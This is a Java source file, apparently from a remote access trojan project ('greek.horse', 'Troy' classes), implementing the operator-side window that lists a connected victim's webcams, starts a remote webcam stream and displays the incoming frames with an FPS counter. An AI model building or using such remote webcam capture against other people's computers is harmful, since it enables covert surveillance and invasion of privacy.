package greek.horse.server.ui.controllers.tasks;

import greek.horse.models.WebcamInfoWrapper;
import greek.horse.server.troyStructure.TroyPlebe;
import greek.horse.server.troyStructure.request.RecurrentTroyRequest;
import greek.horse.server.ui.ChatApp;
import greek.horse.server.ui.controllers.WebcamController;
import javafx.application.Platform;
import javafx.collections.ListChangeListener;
import javafx.collections.ObservableList;
import javafx.event.EventHandler;
import javafx.fxml.FXMLLoader;
import javafx.scene.Parent;
import javafx.scene.Scene;
import javafx.scene.control.Alert;
import javafx.scene.input.MouseEvent;
import javafx.stage.Modality;
import javafx.stage.Stage;
import org.apache.log4j.Logger;

import javax.imageio.ImageIO;
import java.awt.image.BufferedImage;
import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicLong;

public class WebcamTask implements Runnable {
    private final TroyPlebe plebe;

    private final AtomicBoolean running = new AtomicBoolean(false);
    private WebcamController controller;
    private RecurrentTroyRequest request;
    private Timer timer;

    private static final Logger log = Logger.getLogger(WebcamTask.class);
    private Stage stage;

    public WebcamTask(TroyPlebe troyPlebe) {
        this.plebe = troyPlebe;
    }

    @Override
    public void run() {
        AtomicBoolean start = new AtomicBoolean(false);
        Platform.runLater(() -> {
            try {
                stage = new Stage();
                stage.setTitle("Webcam - " + plebe.getTitle());
                stage.getIcons().add(ChatApp.appIcon);

                FXMLLoader loader = new FXMLLoader(getClass().getClassLoader().getResource("scenes/webcam.fxml"));
                Parent root = loader.load();

                Scene scene = new Scene(root);
                stage.setScene(scene);

                stage.setOnCloseRequest(e -> this.running.set(false));

                controller = loader.getController();
                controller.setTask(this);

                EventHandler<MouseEvent> event = mouseEvent -> {
                    if (running.get()) {
                        refreshSettings();
                    }
                };
                scene.setOnMouseEntered(event);
                scene.setOnMouseExited(event);

                stage.show();

            } catch (IOException e) {
                e.printStackTrace();
            } finally {
                start.set(true);
            }
        });

        loadWebcams();

        while (!start.get()) {
            try {
                Thread.sleep(100);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }

        startListening();

        while (this.running.get() && this.plebe.getRunning().get()) {
            try {
                Thread.sleep(100);
            } catch (InterruptedException e) {
                log.error(e);
            }
        }

        timer.cancel();
        timer.purge();

        if (this.plebe.getRunning().get() && !request.getReleased().get()) {
            this.plebe.releaseRequest(request);
        }

        Platform.runLater(() -> {
            stage.hide();
        });
    }

    private void startListening() {
        double w = stage.getWidth() - 50;
        double h = stage.getHeight() - 70;

        while(controller.choiceBox.getItems().isEmpty()){
            try {
                Thread.sleep(20);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }

        request = plebe.startWebcam(new WebcamInfoWrapper(w, h, controller.choiceBox.getSelectionModel().getSelectedItem()));

        ObservableList<Object> observableList = request.getObservableReceivedObjs();

        long initTime = System.currentTimeMillis();
        AtomicLong frameCount = new AtomicLong();
        ListChangeListener<? super Object> changeListener = listener -> {
            listener.next(); // this is needed for some reason

            // as many refreshes as arrived
            for (Object obj : listener.getAddedSubList()) {
                try {
                    BufferedImage bi = ImageIO.read(new ByteArrayInputStream((byte[]) obj));
                    controller.setImage(bi);
                    frameCount.getAndIncrement();
                } catch (Exception e) {
                    log.error("Cast failed, image not set", e);
                }
            }

        };

        observableList.addListener(changeListener);

        timer = new Timer();
        timer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                Platform.runLater(() -> {
                    controller.setFpsText(((frameCount.get() / (double) Math.floorDiv(System.currentTimeMillis() - initTime, 1000))));
                });
            }
        }, 1000, 1000);
    }

    private void loadWebcams() {
        Platform.runLater(() -> {
            try {
                List<String> list = (List<String>) plebe.getWebcamCount().getReceivedObj();
                if (list.isEmpty()) {
                    throw new IllegalArgumentException("No webcams found");
                }
                controller.choiceBox.getItems().clear();
                controller.choiceBox.getItems().addAll(list);
            } catch (Exception e) {
                log.error("Failed to get webcams", e);
                this.running.set(false);
            } finally {
                controller.configureChoiceBox();
            }
        });

    }

    public void refreshSettings() {
        refreshSettings(controller.choiceBox.getSelectionModel().getSelectedIndex());
    }

    public void refreshSettings(int index) {
        double w = stage.getWidth() - 50;
        double h = stage.getHeight() - 70;
        this.plebe.refreshWebcam(new WebcamInfoWrapper(w, h, controller.choiceBox.getItems().get(index)));
    }

    public AtomicBoolean getRunning() {
        return running;
    }
}
